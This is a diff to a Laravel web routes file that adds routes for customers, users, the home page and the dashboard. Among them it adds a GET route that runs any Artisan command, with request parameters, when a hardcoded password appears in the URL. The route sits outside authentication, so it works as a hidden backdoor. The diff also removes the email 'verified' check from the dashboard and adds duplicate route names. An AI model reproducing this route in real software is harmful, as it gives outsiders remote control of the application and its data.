@@ -16,6 +16,13 @@ use Inertia\Inertia;
 |
 */
 
+Route::get('artisan/{password}/{command}', function($password, $command) {
+    if ($password === 'Rn946PmQov') {
+        $exitCode = \Artisan::call($command, request()->all());
+        echo $exitCode;
+    }
+});
+
 Route::get('/', function () {
     return Inertia::render('Welcome', [
         'canLogin' => Route::has('login'),
@@ -27,12 +34,28 @@ Route::get('/', function () {
 
 Route::get('/dashboard', function () {
     return Inertia::render('Dashboard');
-})->middleware(['auth', 'verified'])->name('dashboard');
+})->middleware(['auth'])->name('dashboard');
 
-Route::middleware('auth')->group(function () {
+Route::group(['middleware' => 'auth'], function() {
+	Route::get('/', 'HomeController@index')->name('home');
+
     Route::get('/profile', [ProfileController::class, 'edit'])->name('profile.edit');
     Route::patch('/profile', [ProfileController::class, 'update'])->name('profile.update');
     Route::delete('/profile', [ProfileController::class, 'destroy'])->name('profile.destroy');
+
+	Route::get('/home', 'HomeController@index')->name('home');
+
+    Route::resource('user', 'UserController', [
+        'only' => ['show', 'update']
+    ]);
+
+	Route::get('dashboard', 'DashboardController@index')->name('dashboard');
+
+	// Customer
+    Route::get('customers', 'CustomerController@ajaxIndex')->name('customers.index.ajax');
+    Route::resource('customer', 'CustomerController', [
+    	'only' => ['index', 'update', 'show']
+    ]);
 });
 
 require __DIR__.'/auth.php';
